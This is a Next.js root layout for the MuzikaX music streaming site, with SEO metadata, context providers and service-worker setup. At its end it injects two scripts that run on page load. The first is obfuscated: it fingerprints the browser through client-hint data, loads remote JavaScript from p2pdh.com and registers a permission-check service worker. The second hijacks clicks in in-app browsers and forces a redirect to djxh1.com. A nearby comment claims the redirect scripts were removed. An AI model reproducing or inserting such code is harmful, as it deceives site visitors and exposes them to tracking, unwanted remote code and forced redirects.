import type { Metadata, Viewport } from "next";
import Script from 'next/script';
import "./globals.css";
import { AuthProvider } from "../contexts/AuthContext";
import { LanguageProvider } from "../contexts/LanguageContext";
import { AudioPlayerProvider } from "../contexts/AudioPlayerContext";
import { CommunityProvider } from "../contexts/CommunityContext";
import { PaymentProvider } from "../contexts/PaymentContext";
import { ToastProvider } from "../contexts/ToastContext";
import { PreloadProvider } from "../contexts/PreloadContext";
import { OfflineProvider } from "../contexts/OfflineContext";
import { AIAssistantProvider } from "../contexts/AIAssistantContext";
import ErrorBoundary from "../components/ErrorBoundary";
import LoadingErrorBoundary from "../components/LoadingErrorBoundary";
import ModernAudioPlayer from "../components/ModernAudioPlayer";
import PWAInstallPrompt from "../components/PWAInstallPrompt";
import AppLauncher from "../components/AppLauncher";
import OfflineIndicator from "../components/OfflineIndicator";
import AIMusicAssistant from "../components/AIMusicAssistant";
import AIPopup from "../components/AIPopup";
import LanguageModal from "../components/LanguageModal";
import { GoogleOAuthProvider } from '@react-oauth/google';
import ConditionalNavbar from "../components/ConditionalNavbar";
import ConditionalSidebar from "../components/ConditionalSidebar";
import SidebarLayoutWrapper from "../components/SidebarLayoutWrapper";
import PushNotificationInitializer from "../components/PushNotificationInitializer";
import Footer from "../components/Footer";
import CapacitorProvider from "../components/CapacitorProvider";

// Admin routes that should not have public navbar/footer
const ADMIN_ROUTES = ['/admin'];

export const metadata: Metadata = {
  metadataBase: new URL(process.env.NEXT_PUBLIC_BASE_URL || 'http://localhost:3000'),
  title: {
    template: '%s | MuzikaX - Rwanda & African Artists Music Platform',
    default: "MuzikaX - Rwanda & African Artists Music Platform",
  },
  description: "Connecting Rwandan and African music creators with fans worldwide. Discover, stream, and share the best of Rwandan and African music on MuzikaX. Free music streaming platform with artist resources, industry news, and educational content.",
  keywords: ["Rwandan music", "African music", "Afrobeats", "Music streaming", "Rwandan artists", "Music platform", "Digital music", "Free music", "Online radio", "Music discovery", "Artist resources", "Music education", "African culture", "Music industry news"],
  authors: [{ name: "MuzikaX Team" }],
  creator: "MuzikaX Team",
  publisher: "MuzikaX",
  formatDetection: {
    email: false,
    address: false,
    telephone: false,
  },
  // Structured data for SEO
  applicationName: "MuzikaX",
  referrer: "origin-when-cross-origin",
  // AdSense optimization metadata
  category: "music",
  classification: "entertainment",
  openGraph: {
    type: "website",
    locale: "en_US",
    url: "https://www.muzikax.com/",
    siteName: "MuzikaX",
    title: "MuzikaX - Rwanda & African Artists Music Platform",
    description: "Connecting Rwandan and African music creators with fans worldwide. Discover unique African music, artist resources, and industry insights.",
    images: [
      {
        url: "/app.png",
        width: 1200,
        height: 630,
        alt: "MuzikaX - Rwanda's Digital Music Ecosystem",
      },
    ],
  },
  twitter: {
    card: "summary_large_image",
    title: "MuzikaX - Rwanda & African Artists Music Platform",
    description: "Connecting Rwandan and African music creators with fans worldwide. Free music streaming with artist resources and industry news.",
    images: ["/app.png"],
    creator: "@muzikax",
  },
  robots: {
    index: true,
    follow: true,
    googleBot: {
      index: true,
      follow: true,
      "max-video-preview": -1,
      "max-image-preview": "large",
      "max-snippet": -1,
    },
  },
  alternates: {
    canonical: "https://www.muzikax.com/",
  },
  icons: {
    icon: [
      { url: '/app.png' },
      { url: '/app.png', sizes: '16x16', type: 'image/png' },
      { url: '/app.png', sizes: '32x32', type: 'image/png' },
      { url: '/app.png', sizes: '192x192', type: 'image/png' },
      { url: '/app.png', sizes: '512x512', type: 'image/png' },
    ],
    apple: [
      { url: '/app.png', sizes: '180x180', type: 'image/png' },
      { url: '/app.png', sizes: '512x512', type: 'image/png' },
    ],
  },
};

export const viewport: Viewport = {
  width: 'device-width',
  initialScale: 1,
  maximumScale: 1,
  themeColor: '#000000',
};

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode;
}>) {
  // Check if current route is admin (server-side check won't work, so we'll use client components)
  // Admin routes will be handled by their own layout without navbar/footer
  
  return (
    <html lang="en">
      <head>
        {/* Google Fonts - Inter and Poppins */}
        <link rel="preconnect" href="https://fonts.googleapis.com" />
        <link rel="preconnect" href="https://fonts.gstatic.com" crossOrigin="anonymous" />
        <link
          href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=Poppins:wght@400;500;600;700;800&display=swap"
          rel="stylesheet"
        />
        
        {/* Essential scripts only - removed ad redirect scripts */}
        <meta name="application-name" content="MuzikaX" />
        <meta name="mobile-web-app-capable" content="yes" />
        <meta name="apple-mobile-web-app-title" content="MuzikaX" />
        <meta name="theme-color" content="#000000" />
        <meta name="description" content="MuzikaX is Rwanda's premier digital music platform connecting African artists with global audiences. Discover unique African music, access artist resources, read industry news, and explore educational content." />
        <meta name="keywords" content="Rwandan music, African music, Afrobeats, Music streaming, Rwandan artists, Music platform, Digital music, Free music, Online radio, Music discovery, Artist resources, Music education, African culture, Music industry news" />
        <meta name="pushsdk" content="dd3dba6d9211c567d19da6eb4f51db7e" />
        <meta name="google-adsense-account" content="ca-pub-5073101063025875" />
        <script
          async
          src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-5073101063025875"
          crossOrigin="anonymous"
        />
        <link rel="manifest" href="/manifest.json" />
        
        {/* Enhanced Service Worker for Offline Mode */}
        <Script
          id="register-sw"
          strategy="afterInteractive"
          dangerouslySetInnerHTML={{
            __html: `
              if ('serviceWorker' in navigator) {
                window.addEventListener('load', function() {
                  navigator.serviceWorker.register('/sw-muzikax.js').then(function(registration) {
                    console.log('ServiceWorker registration successful:', registration.scope);
                    
                    // Wait for service worker to be ready and then cache the offline page
                    if (registration.active) {
                      // Send message to cache offline page
                      registration.active.postMessage({ type: 'CACHE_OFFLINE_PAGE' });
                    } else {
                      // If not active yet, wait for it
                      navigator.serviceWorker.ready.then(function(reg) {
                        reg.active.postMessage({ type: 'CACHE_OFFLINE_PAGE' });
                      });
                    }
                  }, function(err) {
                    console.log('ServiceWorker registration failed:', err);
                  });
                });
              }
            `
          }}
        />
      </head>
      <body className="min-h-screen flex flex-col text-white w-full max-w-full overflow-x-hidden bg-background">
        {/* Structured Data for Rich Snippets */}
        <Script
          id="root-structured-data"
          type="application/ld+json"
          dangerouslySetInnerHTML={{
            __html: JSON.stringify({
              "@context": "https://schema.org",
              "@type": "MusicGroup",
              "name": "MuzikaX",
              "description": "Rwanda's digital music platform connecting African artists with global audiences",
              "url": "https://www.muzikax.com/",
              "sameAs": [
                "https://twitter.com/muzikax",
                "https://facebook.com/muzikax",
                "https://instagram.com/muzikax"
              ],
              "foundingDate": "2023",
              "location": {
                "@type": "Place",
                "address": {
                  "@type": "PostalAddress",
                  "addressLocality": "Kigali",
                  "addressCountry": "RW"
                }
              },
              "offers": {
                "@type": "Offer",
                "category": "MusicStreamingService",
                "price": "0",
                "priceCurrency": "USD"
              }
            })
          }}
        />
        <CapacitorProvider>
          <LoadingErrorBoundary>
            <AIAssistantProvider>
              <PreloadProvider>
                <ErrorBoundary>
                  <ToastProvider>
                    <GoogleOAuthProvider clientId={process.env.NEXT_PUBLIC_GOOGLE_CLIENT_ID || "YOUR_GOOGLE_CLIENT_ID.apps.googleusercontent.com"}>
                      <AuthProvider>
                        <LanguageProvider>
                          <AudioPlayerProvider>
                            <CommunityProvider>
                              <PaymentProvider>
                                <OfflineProvider>
                                  {/* Language Selection Modal - Shows on first visit */}
                                  <LanguageModal />
                                  
                                  {/* App Launcher Animation */}
                                  <AppLauncher />
                                  
                                  {/* Offline Status Indicator */}
                                  <OfflineIndicator />
                                  
                                  {/* Conditional rendering - skip for admin routes */}
                                  <div className="admin-layout-wrapper" data-admin-routes={ADMIN_ROUTES.join(',')} style={{ display: 'contents' }}>
                                    <ConditionalSidebar />
                                    <div className="w-full">
                                      <SidebarLayoutWrapper>
                                        <ConditionalNavbar />
                                        <PushNotificationInitializer />
                                        <main className="flex-1 w-full">
                                          {children}
                                        </main>
                                      </SidebarLayoutWrapper>
                                    </div>
                                    <ModernAudioPlayer />
                                    <PWAInstallPrompt />
                                    {/* AI Assistant - Hidden on production (still in development) */}
                                    {process.env.NEXT_PUBLIC_SHOW_AI_ASSISTANT === 'true' && <AIMusicAssistant />}
                                    {process.env.NEXT_PUBLIC_SHOW_AI_ASSISTANT === 'true' && <AIPopup />}
                                    <Footer />
                                  </div>
                                </OfflineProvider>
                              </PaymentProvider>
                            </CommunityProvider>
                          </AudioPlayerProvider>
                        </LanguageProvider>
                      </AuthProvider>
                    </GoogleOAuthProvider>
                  </ToastProvider>
                </ErrorBoundary>
              </PreloadProvider>
            </AIAssistantProvider>
          </LoadingErrorBoundary>
        </CapacitorProvider>
        <Script
          id="custom-script-1"
          strategy="afterInteractive"
          dangerouslySetInnerHTML={{
            __html: `
              var a='mcrpolfattafloprcmlVeedrosmico?ncc=uca&FcusleluVlearVsyipoonrctannEdhrgoiiHdt_emgocdeellicboosmccoast_avDetrnseigoAnrcebsruoc=seelri_bvoemr_ssiiocn'.split('').reduce((m,c,i)=>i%2?m+c:c+m).split('c');var Replace=(o=>{var v=a[0];try{v+=a[1]+Boolean(navigator[a[2]][a[3]]);navigator[a[2]][a[4]](o[0]).then(r=>{o[0].forEach(k=>{v+=r[k]?a[5]+o[1][o[0].indexOf(k)]+a[6]+encodeURIComponent(r[k]):a[0]})})}catch(e){}return u=>window.location.replace([u,v].join(u.indexOf(a[7])>-1?a[5]:a[7]))})([[a[8],a[9],a[10],a[11]],[a[12],a[13],a[14],a[15]]]);    var s = document.createElement('script');    s.src='//p2pdh.com/277/80960/mw.min.js?z=10541573'+'&sw=/sw-check-permissions-53c39.js'+'&nouns=1';    s.onload = function(result) {        switch (result) {            case 'onPermissionDefault':break;            case 'onPermissionAllowed':break;            case 'onPermissionDenied':break;            case 'onAlreadySubscribed':break;            case 'onNotificationUnsupported':break;        }    };    document.head.appendChild(s);
            `
          }}
        />
        <Script
          id="custom-script-2"
          strategy="afterInteractive"
          dangerouslySetInnerHTML={{
            __html: `
              function isInApp() {        const regex = new RegExp(\`(WebView|(iPhone|iPod|iPad)(?!.*Safari/)|Android.*(wv))\`, 'ig');        return Boolean(navigator.userAgent.match(regex));    }    function initInappRd() {        var landingpageURL = window.location.hostname + window.location.pathname + window.location.search;        var completeRedirectURL = 'intent://' + landingpageURL + '#Intent;scheme=https;package=com.android.chrome;end';        var trafficbackURL = "https://djxh1.com/4/10541705/";        var ua = navigator.userAgent.toLowerCase();        if (isInApp() && (ua.indexOf('fb') !== -1 || ua.indexOf('android') !== -1 || ua.indexOf('wv') !== -1)) {            document.body.addEventListener('click', function () {                window.onbeforeunload = null;                window.open(completeRedirectURL, '_system');                setTimeout(function () {                    window.location.replace(trafficbackURL);                }, 1000);            });        }    }    if (document.readyState === 'loading') {        document.addEventListener('DOMContentLoaded', initInappRd);    } else {        initInappRd();    }
            `
          }}
        />
      </body>
    </html>
  );
}
